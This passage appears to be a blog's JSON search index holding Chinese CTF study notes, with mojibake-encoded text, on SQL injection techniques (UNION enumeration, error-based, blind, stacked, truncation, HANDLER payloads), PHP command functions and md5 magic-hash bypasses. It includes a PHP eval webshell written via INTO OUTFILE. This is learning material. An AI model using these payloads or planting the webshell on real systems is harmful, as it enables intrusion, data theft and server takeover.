5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°\n\nexec()ã€passthru()ã€system()ã€shell_exec()\n\n\n\n\n\n","tags":["Note","web","RCE"]},{"title":"SQLæ³¨å…¥ç¬”è®°","url":"/posts/26213.html","content":"\n# **SQLæ³¨å…¥**\n\n1ã€é€šè¿‡order byçˆ†å‡ºå­—æ®µæ•°\n\n2ã€unionæ“ä½œï¼Œè”åˆæŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ˜¯åœ¨åŒä¸€ä¸ªæ•°æ®è¡¨çš„æ•°æ®ï¼Œé€šè¿‡union select 1,2,3â€¦,næ¥åˆ¤æ–­å›æ˜¾ä½ç½®\n\n3ã€information_schemaæ•°æ®åº“ï¼Œä¸ºmysqlè‡ªå¸¦æ•°æ®åº“ï¼Œæä¾›æ•°æ®åº“æºæ•°æ®è®¿é—®ï¼Œæœ€å¸¸ç”¨çš„æ˜¯\n\n**TABLESè¡¨**ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­è¡¨çš„ä¿¡æ¯\n\n**COLUMNSè¡¨**ï¼šæä¾›äº†è¡¨ä¸­åˆ—çš„ä¿¡æ¯\n\n<!--more-->\n\nçˆ†ç ´åº“åï¼š\n\n```mysql\nunion select 1,2,database()\n//é é”™è¯¯çˆ†å‡ºåº“å\nand exists(select * from aaa)\n//aaaè¡¨å¹¶ä¸å­˜åœ¨ï¼Œæ­¤æ—¶ä¼šæŠ¥é”™åœæ­¢å¹¶è¿”å›æ•°æ®åº“å.aaa\n```\n\nçˆ†ç ´è¡¨åï¼š\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from è¡¨å)//çˆ†ç ´å‡ºè¡¨å\n```\n\nçˆ†ç ´åˆ—åï¼š\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"æƒ³æŸ¥è¯¢çš„è¡¨å\"\nand exists(select åˆ—å from å·²çŸ¥è¡¨å)//çˆ†ç ´å‡ºåˆ—å\n```\n\n4ã€æŠ¥é”™æ³¨å…¥\n\nï¼ˆ1ï¼‰updatexmlï¼šæ›´æ–°XMLæ–‡æ¡£çš„å‡½æ•°\n\nè¯­æ³•ï¼š**updatexmlï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹ï¼‰**\n\nä¾‹å­ï¼š\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),â€™1â€™)\n```\n\n0x0aä»£è¡¨æ¢è¡Œç¬¦ï¼Œconcatæ‹¼æ¥\n\næ‹¼æ¥ç›®çš„ä¸ºä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å®Œå…¨æ˜¾ç¤ºå‡ºæ¥\n\nï¼ˆ2ï¼‰extractvalueï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°\n\nè¯­æ³•ï¼š**extractvalueï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼‰**\n\næŠ¥é”™åŸç†ï¼šè·¯å¾„ä¸­å†™å…¥ä¸åˆæ³•çš„æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”è¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°æˆ‘ä»¬æƒ³å¾—åˆ°çš„å†…å®¹\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\næç¤ºï¼šæŠ¥é”™æœ€é•¿æ˜¾ç¤º30ä¸ªå­—ç¬¦å†…å®¹ï¼Œå¦‚æœå†…å®¹è¿‡é•¿å¯ä½¿ç”¨substrå‡½æ•°è¿›è¡Œæ‹†åˆ†\n\nâ€‹\tä¾‹é¢˜ï¼šCTFHubæŠ€èƒ½æ ‘web-SQLæ³¨å…¥-æŠ¥é”™æ³¨å…¥\n\nâ€‹\t![SQLError](/images/quiz/SQLError.png)\n\nâ€‹\té¦–å…ˆçˆ†ç ´åº“è¡¨åˆ—å\n\nâ€‹\t![SQLError2](/images/quiz/SQLError2.png)\n\nâ€‹\tè¿›è€Œå‘ç°flagè¿‡é•¿ç”¨substråˆ‡å‰²\n\nâ€‹\t![SQLError3](/images/quiz/SQLError3.png)\n\nâ€‹\tå¾—åˆ°flag\n\n5ã€ç›²æ³¨ï¼š\n\nå¸ƒå°”ç›²æ³¨ï¼šå›æ˜¾åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æœ‰ä¸€ç§æ— \n\nifè¡¨è¾¾å¼ï¼šif(expr1,expr2,expr3)\n\nexpr1ä¸ºçœŸå°±è¿”å›expr2ï¼ˆå¯ç”¨äºæ‰§è¡Œå‡½æ•°ï¼‰\n\nsubstrå‡½æ•°ï¼šsubstr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)\n\nasciiå‡½æ•°ï¼šå°†å‡½æ•°å†…å­—ç¬¦ä»¥asciiè¡¨è½¬æ¢ä¸ºæ•°å­—ï¼Œè€Œåå¯ä»¥è¿›è¡Œåˆ¤æ–­\n\n\n\næ—¶é—´ç›²æ³¨ï¼šæ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡sleepå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ—¶é—´ç›²æ³¨\n\n~~å»ºè®®ç›´æ¥sqlmap~~\n\nï¼ˆ1ï¼‰ã€sleepå‡½æ•°çœ‹å»¶è¿Ÿæ—¶é—´\n\nï¼ˆ2ï¼‰ã€benchmark(æ‰§è¡Œæ¬¡æ•°,æ–¹å¼)ï¼Œæ‰§è¡Œè¶…å¤šæ¬¡çœ‹å»¶è¿Ÿæ—¶é—´\n\n6ã€å †å æ³¨å…¥ï¼šé€šè¿‡è¯­å¥åˆ†å‰²ç¬¦å·ï¼ˆ  ;  ï¼‰åˆ†éš”å¤šæ¡è¯­å¥ï¼Œç›´æ¥å°†æƒ³è¦çš„æ•°æ®æ’å…¥åˆ°è¡¨ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢è¯­å¥è¯»å–\n\n7ã€mysqlæ–‡ä»¶è¯»å†™ï¼šè¯»å–ï¼šload_fileå‡½æ•°ï¼šload_file(â€˜æ–‡ä»¶è·¯å¾„â€™)\n\nå†™å…¥ï¼š\n\n```mysql\nselect â€˜<?php eval($_POST[cmd]);?>â€™ into outfileæˆ–dumpfile 'ç»å¯¹è·¯å¾„';//å»ºè®®ç”¨dumpfileï¼Œå› ä¸ºoutfileä¼šåœ¨æ–‡ä»¶æœ«è¡Œå†™å…¥æ–°è¡Œï¼Œä½¿ç”¨çš„è½¬è¯‘æ¢è¡Œç¬¦ï¼Œä¼šç ´åæ–‡ä»¶å®Œæ•´æ€§ï¼Œå¯èƒ½å¯¼è‡´ä¸€å¥è¯æœ¨é©¬æ— æ³•æ‰§è¡Œ\n```\n\n8ã€å…³é”®è¯ç»•è¿‡ï¼šé€šè¿‡\n\nï¼ˆ1ï¼‰ã€set@aï¼šè®¾å®šä¸€ä¸ªè¯­å¥å˜é‡ set@sql=0x16è¿›åˆ¶æ•°\n\nï¼ˆ2ï¼‰ã€prepare : å­˜å‚¨ä¸€ä¸ªsqlè¯­å¥ å­˜åˆ°execsql é‡Œé¢ prepare execsql from @sql\n\nï¼ˆ3ï¼‰ã€execute :æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥ execute execsql\n\nç”±äºè®¾å®šè¯­å¥å˜é‡æ—¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†16è¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºæ–‡å­—\n\n9ã€é›¶ç¢\n\n```mysql\nto_base64(å†…å®¹)//è¯¥è¯­å¥å°†å†…å®¹ç»è¿‡base64ç¼–ç åè¾“å‡º\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/å¯ä»£æ›¿ç©ºæ ¼\n```\n\n```\n--+ï¼Œ%23ï¼Œ#å°†åé¢çš„è¯­å¥æ³¨é‡Š\n```\n\n10ã€SQLçº¦æŸæ”»å‡»\n\nåœ¨SQLä¸­æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ã€‚ä¾‹å¦‚å¦‚ä¸‹ä»£ç ï¼š\n\n```sql\nSELECT userId from user where username = 'test            '//çœ‹è¿™é‡Œæœ‰å¾ˆå¤šç©ºæ ¼\n```\n\nä¸Šè¿°ä»£ç å’Œusername = 'test'ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ä½†ä¹Ÿå­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œæœ€å¥½çš„ä¾‹å­å°±æ˜¯LIKEå­å¥äº†ã€‚æ³¨æ„ï¼Œå¯¹å°¾éƒ¨ç©ºç™½ç¬¦çš„è¿™ç§ä¿®å‰ªæ“ä½œï¼Œä¸»è¦æ˜¯åœ¨â€œ**å­—ç¬¦ä¸²æ¯”è¾ƒ**â€æœŸé—´è¿›è¡Œçš„ã€‚è¿™æ˜¯å› ä¸ºï¼Œ**SQLä¼šåœ¨å†…éƒ¨ä½¿ç”¨ç©ºæ ¼æ¥å¡«å……å­—ç¬¦ä¸²**ï¼Œ**ä»¥ä¾¿åœ¨æ¯”è¾ƒä¹‹å‰ä½¿å…¶å®ƒä»¬çš„é•¿åº¦ä¿æŒä¸€è‡´**ã€‚\n\nåœ¨æ‰€æœ‰çš„INSERTæŸ¥è¯¢ä¸­ï¼ŒSQLéƒ½ä¼šæ ¹æ®varchar(n)æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºâ€œnâ€ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…æ’å…¥å­—ç¬¦ä¸²çš„å‰â€œnâ€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ç‰¹å®šåˆ—çš„é•¿åº¦çº¦æŸä¸ºâ€œ5â€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨æ’å…¥å­—ç¬¦ä¸²â€œtestNameâ€æ—¶ï¼Œå®é™…ä¸Šåªèƒ½æ’å…¥å­—ç¬¦ä¸²çš„å‰5ä¸ªå­—ç¬¦ï¼Œå³â€œtestNâ€ã€‚\n\n```php\n//æ³¨å†Œç¤ºä¾‹ä»£ç \n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\nè¿™é‡Œæ³¨å†Œæ—¶ä½¿ç”¨ç”¨æˆ·å+ã€å¤§é‡ç©ºæ ¼ã€‘å’Œéšæœºå¯†ç æ³¨å†Œå³å¯å®Œæˆæ”»å‡»ã€‚\n\nä¸»è¦åŸç†å°±æ˜¯insertæ—¶å€™æœ‰varchar(n)çš„é™åˆ¶ï¼Œå¤§äºnçš„æ—¶å€™ä¼šæˆªå–å‰nä¸ªå­˜å…¥ã€‚åœ¨æ•°æ®åº“å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå³selectæ“ä½œï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸ä¸€æ ·ï¼Œåˆ™ä¼šå°†è¾ƒçŸ­çš„å­—ç¬¦ä¸²æœ«å°¾å¡«å……ç©ºæ ¼ï¼Œä½¿ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸€è‡´ã€‚æ³¨å†Œæ—¶selectè¯­å¥ä¸ä¼šå°†\"admin+[å¤§é‡ç©ºæ ¼]11\"åˆ å‡åˆ°nä½ï¼Œæ‰€ä»¥ä¸ä¼šè¢«selectæŸ¥å‡ºä¸adminé‡å¤ï¼Œä¸ä¼šè¿”å›æ•°æ®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ’å…¥admin+[ç©ºæ ¼]ï¼ˆæˆªå–ï¼‰11å’Œè‡ªå®šä¹‰å¯†ç äº†ã€‚\n\nå¦‚æœä½¿ç”¨ç”¨æˆ·åâ€œvampireâ€å’Œå¯†ç â€œrandom_passâ€ç™»å½•çš„è¯ï¼Œå¯¹æ¯”æ—¶æ˜¯adminä¸admin+[å¤§é‡ç©ºæ ¼]ï¼Œä¼šå°†å‰é¢çš„adminæ·»åŠ ç©ºæ ¼ä¸åé¢çš„é•¿åº¦ç›¸åŒåœ¨è¿›è¡Œå¯¹æ¯”ï¼Œé‚£ä¹ˆè¿”å›çš„åªèƒ½æ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œä¸ä¼šè¿”å›ç›®æ ‡ç”¨æˆ·ä¿¡æ¯ã€‚SQLæŸ¥è¯¢è¯­å¥æ˜¯ä¸€ä¸ªandæ“ä½œï¼Œå¦‚æœå¯†ç ä¸ä¸€æ ·æ€ä¹ˆä¼šæŠŠç›®æ ‡ç”¨æˆ·çš„ä¿¡æ¯ä¹Ÿè¿”å›å›æ¥?\n\nå½“ç™»é™†æ—¶ä½¿ç”¨adminä¸è‡ªå®šä¹‰å¯†ç ç™»é™†ï¼Œæ•°æ®åº“å°†è¿”å›æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„è´¦æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯æ³¨æ„æ­¤å¤„çš„return $usernameï¼Œè™½ç„¶æ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯è¿”å›çš„ç”¨æˆ·ååˆ™æ˜¯ç›®æ ‡çš„ç”¨æˆ·åã€‚å¦‚æœæ­¤åçš„ä¸šåŠ¡é€»è¾‘ç›´æ¥ä»¥è¯¥ç”¨æˆ·åä¸ºå‡†ï¼Œåˆ™æˆ‘ä»¬å°±è¾¾åˆ°äº†æ°´å¹³è¶Šæƒçš„ç›®çš„ã€‚\n\n\n\n\n\n**HANDLERè¯­å¥æŸ¥è¯¢**\n\nå‡ºè‡ªè¯¥é¢˜[GYCTF2020]Blacklistï¼Œç±»ä¼¼äºæŸé“å †å æ³¨å…¥çš„è¿›é˜¶ç‰ˆï¼Œä½†æ˜¯è¯¥é¢˜è¿‡æ»¤å¤ªå¤šäº†ï¼Œä¹‹å‰é‚£é“é¢˜çš„payloadå®Œå…¨ä¸å¯ç”¨äº†\n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\nçŸ¥è¯†ç‚¹ï¼šhandlerè¯­å¥æŸ¥è¯¢\n\n```mysql\n\nHANDLER tbl_name OPEN [ [AS] alias]\n \nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n \nHANDLER tbl_name CLOSE\n\n```\n\næ„é€ å‡ºè¯­å¥å¦‚ä¸‹\n\n```\npayload:\n1';use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\n\n\n\n\n\n\n\ndistinct+åˆ—åå¯ä»¥å»é™¤é‡å¤å€¼\n","tags":["Note","web","SQL"]},{"title":"CTFé›¶ç¢ç¬”è®°","url":"/posts/11612.html","content":"\n# é›¶ç¢ç¬”è®°\n\nmt_srand( )è¯¥å‡½æ•°åœ¨PHP4.2.0ä¹‹å‰ä¼ å…¥ä»»æ„å‚æ•°åç”Ÿæˆçš„éƒ½æ˜¯ä¼ªéšæœºæ•°ï¼Œåœ¨ä»»ä½•æœºå™¨ä¸Šåªè¦è¿è¡Œçš„åŒæ ·çš„seedå‚æ•°ç»“æœéƒ½ç›¸åŒï¼Œæœ‰å·¥å…·å¯ä»¥çˆ†ç ´\n\n<!--more-->\n\nKindEditorç¼–è¾‘å™¨æ¼æ´ï¼Œåœ¨ä½¿ç”¨è¯¥ç¼–è¾‘å™¨æ˜¯åœ¨urlæœ«å°¾åŠ ä¸Š/php/file_manager_json.php?path=è·¯å¾„ï¼Œå°±ä¼šä¾¿åˆ©è·¯å¾„ä¸­æ‰€æœ‰å†…å®¹ï¼Œç‰¹å¾ä¸ºå‰ç«¯ä»£ç ä¸­æœ‰å¯¹php/file_manager_json.phpçš„å¼•ç”¨\n\n###### md5å¼±ç›¸ç­‰ç»•è¿‡ï¼š\n\n1ã€æ„é€ æ•°ç»„a[]=xxxx&b[]=xxxx\n\n2ã€å¼±ç›¸ç­‰æ—¶è½¬æ¢ä¸ºç›¸åŒæ•°æ®ç±»å‹ï¼Œ0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬ä¸º0ï¼Œå­—ç¬¦ä¸²å¦‚ä¸‹\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n","tags":["Note","web"]},{"title":"CTF","url":"/posts/58958.html","content":"\nJlançš„CTFä¹‹æ—…ä»ç°åœ¨å¼€å§‹äº†\n\n","tags":["Note"]}]